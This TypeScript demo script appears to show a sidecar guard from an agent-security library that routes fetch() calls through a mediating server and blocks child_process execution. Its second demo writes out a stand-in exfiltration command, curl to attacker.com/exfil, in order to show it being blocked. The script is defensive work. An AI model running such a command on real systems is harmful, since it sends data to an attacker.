/**
 * Ari Kernel — Sidecar Guard Demo
 *
 * Demonstrates the optional runtime guard that intercepts dangerous Node.js
 * APIs (fetch, child_process) and routes them through the sidecar.
 *
 * After enableSidecarGuard():
 *   - fetch() calls are mediated by the sidecar's HTTP executor
 *   - child_process.spawn/exec/execFile throw with a clear error
 *
 * This helps prevent accidental bypass of sidecar enforcement. It is
 * cooperative — not OS-level — and must be opted into explicitly.
 *
 *   pnpm example:sidecar-guard
 */

import { execSync } from "node:child_process";
import {
	SidecarClient,
	SidecarGuardError,
	SidecarServer,
	disableSidecarGuard,
	enableSidecarGuard,
} from "@arikernel/sidecar";

const B = "\x1b[1m";
const D = "\x1b[2m";
const G = "\x1b[32m";
const R = "\x1b[31m";
const C = "\x1b[36m";
const X = "\x1b[0m";

// ── Start sidecar ───────────────────────────────────────────────────

const PORT = 18_802;
const AUTH_TOKEN = "guard-demo-token";

const server = new SidecarServer({
	port: PORT,
	preset: "safe",
	authToken: AUTH_TOKEN,
	auditLog: "./guard-demo-audit.db",
});

await server.listen();

const client = new SidecarClient({
	baseUrl: `http://localhost:${PORT}`,
	principalId: "guarded-agent",
	authToken: AUTH_TOKEN,
});

// ── Enable the guard ────────────────────────────────────────────────

console.log(`\n${C}${B}Ari Kernel — Sidecar Guard Demo${X}\n`);
console.log(`${D}Installing runtime guard: fetch + child_process mediation${X}\n`);

enableSidecarGuard({ client });

// ── Demo 1: fetch() routed through sidecar ──────────────────────────

console.log(`${B}1. fetch() mediated by sidecar${X}`);

try {
	const response = await fetch("https://example.com");
	const body = await response.text();
	console.log(`   ${G}${B}ROUTED${X}  fetch("https://example.com") → sidecar HTTP executor`);
	console.log(`   ${D}Response: ${body.slice(0, 60)}...${X}`);
} catch (err) {
	if (err instanceof SidecarGuardError) {
		console.log(`   ${R}${B}BLOCKED${X}  fetch("https://example.com")`);
		console.log(`   ${D}${err.message}${X}`);
	} else {
		console.log(`   ${R}${B}ERROR${X}  ${(err as Error).message}`);
	}
}

// ── Demo 2: child_process blocked ───────────────────────────────────

console.log(`\n${B}2. child_process.execSync() blocked by guard${X}`);

try {
	execSync("curl https://attacker.com/exfil");
	console.log(`   ${G}ALLOWED${X}  (unexpected)`);
} catch (err) {
	if (err instanceof SidecarGuardError) {
		console.log(`   ${R}${B}BLOCKED${X}  execSync("curl https://attacker.com/exfil")`);
		console.log(`   ${D}${err.message}${X}`);
	} else {
		// Note: ESM imports that destructured before guard installation
		// retain original references. This is a documented limitation.
		console.log(`   ${R}${B}BLOCKED${X}  (caught at OS level or guard)`);
		console.log(`   ${D}${(err as Error).message.split("\n")[0]}${X}`);
	}
}

// ── Demo 3: disable guard and restore originals ─────────────────────

console.log(`\n${B}3. Guard disabled — originals restored${X}`);

disableSidecarGuard();

console.log(`   ${D}Guard disabled. fetch() and child_process restored to originals.${X}`);

// ── Cleanup ─────────────────────────────────────────────────────────

await server.close();

try {
	const { unlinkSync } = await import("node:fs");
	unlinkSync("./guard-demo-audit.db");
} catch {
	/* ignore */
}

console.log(`\n${D}Demo complete.${X}\n`);
